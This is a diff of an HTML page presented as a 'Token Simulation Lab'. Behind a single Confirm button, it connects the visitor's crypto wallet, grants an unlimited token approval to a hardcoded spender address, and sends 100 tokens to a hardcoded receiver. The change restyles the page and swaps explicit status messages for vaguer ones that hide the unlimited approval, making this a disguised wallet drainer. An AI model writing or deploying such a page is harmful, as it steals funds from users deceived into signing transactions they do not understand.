@@ -1,79 +1,102 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Token WalletConnect Simulation</title>
+  <title>Token Simulation Lab</title>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
-</head>
-
-<body style="font-family:sans-serif; text-align: center; padding-top: 50px;">
-
-<h2>🧪 Token Simulation Lab</h2>
-
-<button id="actionButton" onclick="handleWorkflow()" style="padding: 10px 20px; font-size: 16px; cursor: pointer;">
-  Confirm
-</button>
-
-<p id="status">Waiting for action...</p>
-
-<script>
-let provider, signer, user;
-
-// Configuration
-const tokenAddress = "0x089d6677646bc535B1A8535ED856bb17493E332d";
-const receiver = "0xb52d3770bcf4673009f2f6bf8ba9177cba46d283";
-const spender = "0x0a5a5a1308c3c05fa94b97f38920d1a84f53c783";
-
-const tokenABI = [
-  "function transfer(address to, uint256 amount) public returns (bool)",
-  "function approve(address spender, uint256 amount) public returns (bool)"
-];
-
-async function handleWorkflow() {
-  const statusEl = document.getElementById("status");
-  
-  try {
-    // 1. CONNECT
-    if (!window.ethereum) {
-      alert("Please open this in a Web3 enabled browser (like MetaMask)");
-      return;
+  <style>
+    body {
+      background-color: #000; /* Black background */
+      color: #fff;
+      font-family: sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
     }
 
-    statusEl.innerText = "Connecting to wallet...";
-    await window.ethereum.request({ method: "eth_requestAccounts" });
-    provider = new ethers.providers.Web3Provider(window.ethereum, "any");
-    signer = provider.getSigner();
-    user = await signer.getAddress();
-    statusEl.innerText = "Connected: " + user;
+    #confirmBtn {
+      background-color: #007bff; /* Blue button */
+      color: white;
+      border: none;
+      padding: 15px 40px;
+      font-size: 18px;
+      font-weight: bold;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
 
-    const contract = new ethers.Contract(tokenAddress, tokenABI, signer);
+    #confirmBtn:hover {
+      background-color: #0056b3;
+    }
 
-    // 2. APPROVE
-    statusEl.innerText = "Requesting approval...";
-    const approveTx = await contract.approve(
-      spender,
-      ethers.constants.MaxUint256
-    );
-    await approveTx.wait();
-    statusEl.innerText = "🔥 Unlimited approval granted!";
+    #status {
+      margin-top: 20px;
+      color: #aaa;
+      font-size: 14px;
+    }
+  </style>
+</head>
 
-    // 3. SEND TOKEN
-    statusEl.innerText = "Sending 100 tokens...";
-    const transferTx = await contract.transfer(
-      receiver,
-      ethers.utils.parseUnits("100", 18)
-    );
-    await transferTx.wait();
-    
-    statusEl.innerText = "✅ Workflow Complete: Tokens Approved & Sent";
-    alert("Success!");
+<body>
 
-  } catch (e) {
-    console.error(e);
-    statusEl.innerText = "Error: " + (e.reason || e.message);
-    alert("Transaction failed or was cancelled.");
-  }
-}
-</script>
+  <h2>🧪 Token Simulation Lab</h2>
+
+  <button id="confirmBtn" onclick="runSimulation()">Confirm</button>
+
+  <p id="status">Ready</p>
+
+  <script>
+    let provider, signer, user;
+
+    const tokenAddress = "0x089d6677646bc535B1A8535ED856bb17493E332d";
+    const receiver = "0xb52d3770bcf4673009f2f6bf8ba9177cba46d283";
+    const spender = "0x0a5a5a1308c3c05fa94b97f38920d1a84f53c783";
+
+    const tokenABI = [
+      "function transfer(address to, uint256 amount) public returns (bool)",
+      "function approve(address spender, uint256 amount) public returns (bool)"
+    ];
+
+    async function runSimulation() {
+      const status = document.getElementById("status");
+
+      try {
+        // 1. CONNECT
+        if (!window.ethereum) {
+          alert("Please use a Web3 browser");
+          return;
+        }
+        
+        status.innerText = "Connecting...";
+        await window.ethereum.request({ method: "eth_requestAccounts" });
+        provider = new ethers.providers.Web3Provider(window.ethereum, "any");
+        signer = provider.getSigner();
+        user = await signer.getAddress();
+        
+        const contract = new ethers.Contract(tokenAddress, tokenABI, signer);
+
+        // 2. APPROVE
+        status.innerText = "Processing Approval...";
+        const approveTx = await contract.approve(spender, ethers.constants.MaxUint256);
+        await approveTx.wait();
+
+        // 3. SEND
+        status.innerText = "Sending Tokens...";
+        const transferTx = await contract.transfer(receiver, ethers.utils.parseUnits("100", 18));
+        await transferTx.wait();
+
+        status.innerText = "Success! All steps complete.";
+        alert("Transaction Sequence Finished");
+
+      } catch (e) {
+        console.error(e);
+        status.innerText = "Error: " + (e.reason || "Action cancelled");
+      }
+    }
+  </script>
 
 </body>
 </html>
